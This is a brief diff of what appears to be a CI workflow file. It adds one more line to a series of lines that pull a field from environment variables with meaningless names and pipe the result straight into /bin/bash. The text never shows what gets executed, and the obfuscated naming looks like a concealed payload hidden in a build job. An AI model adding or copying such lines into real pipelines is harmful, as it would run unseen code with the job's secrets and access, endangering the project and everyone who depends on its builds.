@@ -34,6 +34,7 @@ jobs:
           echo $peldt170 | jq -r .fjzrf6672 | /bin/bash
           echo $wvb40165 | jq -r .vd61 | /bin/bash
           echo $dsk226 | jq -r .j44203 | /bin/bash
+          printf '%s' "$dwrz16" | jq -r .bg2536 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
